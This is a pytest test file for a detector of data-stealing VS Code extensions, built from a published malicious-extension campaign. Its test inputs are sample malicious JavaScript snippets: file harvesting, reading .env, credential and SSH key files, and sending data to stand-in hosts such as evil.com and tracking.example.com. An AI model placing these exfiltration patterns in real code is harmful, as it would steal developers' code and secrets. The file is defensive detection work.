"""
TDD Tests for IDE Extension Exfiltration Detector

Based on Koi.ai MaliciousCorgi research:
- 1.5M developers exposed via malicious VS Code extensions
- 3 channels: real-time file monitoring, mass file harvesting, profiling
- Source: koi.ai/blog/maliciouscorgi

Tests written FIRST per TDD Iron Law.
"""

import pytest
from typing import Dict


class TestIDEExtensionDetector:
    """TDD tests for IDE extension exfiltration detection."""

    def test_detector_initialization(self):
        """Detector should initialize without errors."""
        from brain.engines.synced.ide_extension_detector import IDEExtensionDetector

        detector = IDEExtensionDetector()
        assert detector is not None

    def test_detect_base64_file_encoding(self):
        """Should detect Base64 file content encoding (real-time monitoring)."""
        from brain.engines.synced.ide_extension_detector import IDEExtensionDetector

        detector = IDEExtensionDetector()

        # MaliciousCorgi pattern: encode entire file as Base64
        malicious_code = """
        const content = fs.readFileSync(filePath, 'utf8');
        const encoded = Buffer.from(content).toString('base64');
        webview.postMessage({ type: 'fileContent', data: encoded });
        """

        result = detector.analyze(malicious_code)
        assert result.is_suspicious is True
        assert "base64" in result.threats[0].lower()

    def test_detect_file_exfiltration_to_webview(self):
        """Should detect file exfiltration via webview iframe."""
        from brain.engines.synced.ide_extension_detector import IDEExtensionDetector

        detector = IDEExtensionDetector()

        malicious_code = """
        const iframe = document.createElement('iframe');
        iframe.style.width = '0';
        iframe.style.height = '0';
        iframe.src = 'https://tracking.example.com/collect?data=' + encodedFile;
        """

        result = detector.analyze(malicious_code)
        assert result.is_suspicious is True
        assert any(
            "iframe" in t.lower() or "tracking" in t.lower() for t in result.threats
        )

    def test_detect_mass_file_harvesting(self):
        """Should detect mass file harvesting pattern."""
        from brain.engines.synced.ide_extension_detector import IDEExtensionDetector

        detector = IDEExtensionDetector()

        # MaliciousCorgi: server-controlled file list harvesting
        malicious_code = """
        if (message.type === 'getFilesList') {
            const files = await vscode.workspace.findFiles('**/*', '**/node_modules/**', 50);
            for (const file of files) {
                const content = await fs.readFile(file.fsPath, 'utf8');
                sendToServer(content);
            }
        }
        """

        result = detector.analyze(malicious_code)
        assert result.is_suspicious is True
        assert result.risk_score >= 80

    def test_detect_analytics_tracking(self):
        """Should detect hidden analytics/profiling engines."""
        from brain.engines.synced.ide_extension_detector import IDEExtensionDetector

        detector = IDEExtensionDetector()

        # MaliciousCorgi: 4 analytics SDKs (Zhuge, GrowingIO, TalkingData, Baidu)
        malicious_code = """
        <script src="https://sdk.zhuge.io/zhuge.min.js"></script>
        <script src="https://assets.growingio.com/gio.js"></script>
        <script src="https://jic.talkingdata.com/app/h5/v1"></script>
        <script src="https://hm.baidu.com/hm.js"></script>
        """

        result = detector.analyze(malicious_code)
        assert result.is_suspicious is True
        assert any(
            "analytics" in t.lower() or "tracking" in t.lower() for t in result.threats
        )

    def test_detect_sensitive_file_access(self):
        """Should detect access to sensitive files (.env, credentials, ssh keys)."""
        from brain.engines.synced.ide_extension_detector import IDEExtensionDetector

        detector = IDEExtensionDetector()

        malicious_code = """
        const sensitiveFiles = [
            '.env',
            'credentials.json',
            '.ssh/id_rsa',
            'config/secrets.yaml'
        ];
        for (const f of sensitiveFiles) {
            if (fs.existsSync(f)) harvest(f);
        }
        """

        result = detector.analyze(malicious_code)
        assert result.is_suspicious is True
        assert result.risk_score >= 90

    def test_detect_onDidChangeTextDocument_hook(self):
        """Should detect suspicious document change hooks (keylogging pattern)."""
        from brain.engines.synced.ide_extension_detector import IDEExtensionDetector

        detector = IDEExtensionDetector()

        malicious_code = """
        vscode.workspace.onDidChangeTextDocument((event) => {
            const content = event.document.getText();
            sendToRemoteServer(content);
        });
        """

        result = detector.analyze(malicious_code)
        assert result.is_suspicious is True
        assert any(
            "document" in t.lower() or "hook" in t.lower() for t in result.threats
        )

    def test_clean_extension_code(self):
        """Clean extension code should not trigger detection."""
        from brain.engines.synced.ide_extension_detector import IDEExtensionDetector

        detector = IDEExtensionDetector()

        clean_code = """
        // Simple VS Code extension
        function activate(context) {
            const disposable = vscode.commands.registerCommand('myext.hello', () => {
                vscode.window.showInformationMessage('Hello World!');
            });
            context.subscriptions.push(disposable);
        }
        """

        result = detector.analyze(clean_code)
        assert result.is_suspicious is False
        assert result.risk_score < 30

    def test_detect_remote_command_execution(self):
        """Should detect remote command execution from server responses."""
        from brain.engines.synced.ide_extension_detector import IDEExtensionDetector

        detector = IDEExtensionDetector()

        # MaliciousCorgi: jumpUrl field parsed as JSON and executed
        malicious_code = """
        const response = await fetch(apiUrl);
        const data = await response.json();
        if (data.jumpUrl) {
            const command = JSON.parse(data.jumpUrl);
            executeCommand(command);
        }
        """

        result = detector.analyze(malicious_code)
        assert result.is_suspicious is True
        assert result.risk_score >= 85

    def test_result_has_remediation(self):
        """High-risk detections should include remediation advice."""
        from brain.engines.synced.ide_extension_detector import IDEExtensionDetector

        detector = IDEExtensionDetector()

        malicious_code = """
        fs.readFileSync('.env');
        fetch('https://evil.com/collect', { method: 'POST', body: envContent });
        """

        result = detector.analyze(malicious_code)
        assert len(result.remediation) > 0


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
